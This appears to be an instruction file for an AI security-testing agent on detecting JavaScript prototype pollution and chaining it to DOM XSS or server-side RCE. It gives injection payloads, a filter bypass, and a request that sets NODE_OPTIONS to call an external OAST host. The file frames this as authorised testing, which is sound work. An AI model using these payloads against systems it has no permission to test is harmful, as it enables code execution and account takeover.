---
name: prototype-pollution
description: Find and prove JavaScript prototype pollution, then chain it to DOM XSS (client-side) or RCE/privilege escalation (server-side). Use when you see __proto__, constructor, or prototype keys accepted in JSON bodies or query/hash params; recursive object merge, deep extend/clone, Object.assign, lodash merge/defaultsDeep, jQuery $.extend, or config-merge patterns; any JS/Node app that merges user-controlled objects; client-side DOM XSS gadgets (script src/transport_url, innerHTML); server-side Express/Node gadgets producing RCE, status-code/JSON-spacing/charset shifts, or child_process arg injection. Keywords: prototype pollution, __proto__, constructor.prototype, gadget, recursive merge, NODE_OPTIONS, execArgv, DOM Invader.
---

# Prototype Pollution

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


## When to test
- JS-heavy single-page apps and Node back-ends that **merge user-controlled objects** into existing objects (config, options, query parsing, JSON bodies).
- Tells: recursive `merge`/`extend`/`clone`/`defaultsDeep`, `Object.assign`, `$.extend(true, ...)`, lodash `_.merge`, query-string libs that build nested objects from `a[b]=c`.
- Any input where `__proto__`, `constructor`, or `prototype` can appear as a key: JSON body, URL query, URL hash/fragment, form data.

## Impact & priority (be honest)
- **Server-side -> RCE / privesc = high-signal.** Report aggressively once proven (OAST or command execution).
- **Client-side -> DOM XSS** when a polluted property reaches a sink (script src, `eval`, `innerHTML`). High-signal when XSS fires.
- **Bare pollution with no reachable gadget = low / often noise.** Polluting `Object.prototype` alone is not impact. Do not report without a chain to XSS, RCE, auth bypass, or DoS.
- Three pieces are always required: **source** (controllable input) -> **(pollution)** -> **gadget** (property read unsafely) -> **sink**.

## Detection
**Client-side**
- Inject via query: `?__proto__[ppfuzz]=1` (and `?constructor[prototype][ppfuzz]=1`).
- Inject via JSON / hash where relevant.
- Confirm in console: `Object.prototype.ppfuzz` returns `1` -> polluted. Or use **DOM Invader** (Burp browser) which auto-finds sources and can auto-build a DOM XSS PoC.

**Server-side** (no console — use observable side effects; all harmless probes):
- **Property reflection:** send `{"__proto__":{"ppfuzz":"x"}}`; look for `ppfuzz` echoed in a JSON response (leaked via `for...in`).
- **Status-code override:** pollute `status`/`statusCode` (e.g. `510`) then trigger an error; watch for the changed status.
- **JSON spacing:** pollute Express `"json spaces":10`; unpatched apps re-indent JSON responses.
- **Charset override:** pollute `content-type` to a UTF-7 charset; a UTF-7 string decodes in the response.
- **Timing/OAST:** see Minimal PoC below.

## Exploitation
1. **Find the source** — which input lands in the merge.
2. **Reach a gadget** — a property the app/library reads after pollution.
3. **Client-side gadget -> DOM XSS:** pollute a property a script-loader uses (e.g. `transport_url`, `src`, sanitizer config) so it builds an attacker script URL or unsanitized HTML.
4. **Server-side gadget -> RCE:** pollute options consumed by a later `child_process` call — `execArgv`/`NODE_OPTIONS` (fork), or `shell`+`input` (execSync). See reference.md for exact gadgets.

## Common payloads & sources (full list in reference.md)
- URL query: `?__proto__[evilProp]=payload`
- URL query via constructor (filter bypass): `?constructor[prototype][evilProp]=payload`
- JSON body: `{"__proto__":{"evilProp":"payload"}}`
- JSON via constructor: `{"constructor":{"prototype":{"evilProp":"payload"}}}`
- Filter bypass (single-pass key strip): `__pro__proto__to__`

## Minimal PoC (safe, for ./_EXPLOIT/)
Keep it minimal and provable. Save the polluting request + the observed gadget effect.

**Client-side (DOM XSS):** harmless marker only.
```
GET /?__proto__[transport_url]=data:,document.title='PP_<token>'// HTTP/1.1
```
PoC = the URL plus a screenshot/console showing `document.title` (or the chosen benign marker) changed via the polluted gadget. Prefer a non-`alert` marker so it's clearly safe.

**Server-side (RCE proof via OAST — no destructive command):**
```
POST /endpoint HTTP/1.1
Content-Type: application/json

{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=<id>.oastify.com"}}
```
Then trigger the code path that spawns a child process. A DNS/HTTP hit to your Collaborator/OAST host proves controllable spawn args -> RCE. For sleep-based proof, inject an arg/eval that delays a fixed N seconds and confirm the response delta. Log the exact request, the spawning endpoint, and the OAST interaction / timing to `./_EXPLOIT/`.

## Chain for impact
Pollution without a reachable gadget is noise; the value is the chain:
- **Server-side PP → gadget (spawn options/env) → RCE.**
- **Client-side PP → DOM XSS** → `/xss` and `/dom-based`.
- **Polluted `role`/`isAdmin` → privilege escalation** → `/access-control-idor` (often the same root cause as mass-assignment → cross-check `/api-testing`).
- Prove the gadget firing, not just the pollution, before `/reporting`.

## Don't report as noise
- `Object.prototype.x` set but no script/server code ever reads it.
- Pollution that only affects the attacker's own session with no security effect.
- "Could theoretically" chains without a demonstrated sink. Prove the gadget fires, or drop it.

## Deep reference
See `reference.md` for prototype mechanics, source/gadget hunting (manual + DOM Invader), full server-side detection and RCE gadgets, filter bypasses, and prevention.
- https://portswigger.net/web-security/prototype-pollution
- https://portswigger.net/web-security/prototype-pollution/client-side
- https://portswigger.net/web-security/prototype-pollution/server-side
